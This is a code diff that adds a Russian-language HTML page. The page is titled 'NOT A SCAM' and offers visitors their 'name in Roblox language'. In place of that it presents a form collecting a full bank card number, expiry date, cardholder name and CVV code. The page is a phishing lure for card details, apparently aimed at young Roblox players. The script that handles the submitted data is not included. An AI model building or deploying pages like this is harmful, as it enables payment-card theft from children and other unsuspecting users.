@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+    <head>
+<title>НЕ ОБМАН</title>
+<link rel="stylesheet" href="style.css">
+    </head>
+    <body>
+        <div class="block1">
+            <img src="robloxchel.png" alt="боблокс" width="350" height="350">
+            <div class="text">
+                <h1 id="robloxname"> Твое имя на языке роблокс</h1>
+            </div>
+        </div>
+        <div class="block2">
+            <form id="form">
+                <table cellpadding="4">
+                    <tr>
+                        <td class="bg">номер карты</td>
+                        <td width="500"><input id="card" type="text" class="inp" placeholder="0000 0000 0000 0000"></td>
+                    </tr>
+                    <tr>
+                        <td class="bg">действительна до</td>
+                        <td width="500"><input id="mm" type="text" placeholder="ММ" class="inp2">/ <input id="gg" class="inp2" type="text"placeholder="ГГ"></td>
+                    </tr>
+                    <tr>
+                        <td class="bg">Имя держателя карты</td>
+                        <td width="500"><input type="text" id="ownername" class="inp" placeholder="ИМЯ ФАМИЛИЯ ЛАТИНИЦЕЙ"></td>
+                    </tr>
+                    <tr>
+                        <td class="bg">CVC2/CVV2</td>
+                        <td><input type="text" class="inp3" id="cv" placeholder="***"></td>
+                    </tr>
+                    <tr>
+                        <td><button type="submit">отправить(необман)</button></td>
+                    </tr>
+
+                </table>
+            </form>
+            <div id="error"></div>
+        </div>
+        <script src="script.js"></script>
+    </body>
+</html>
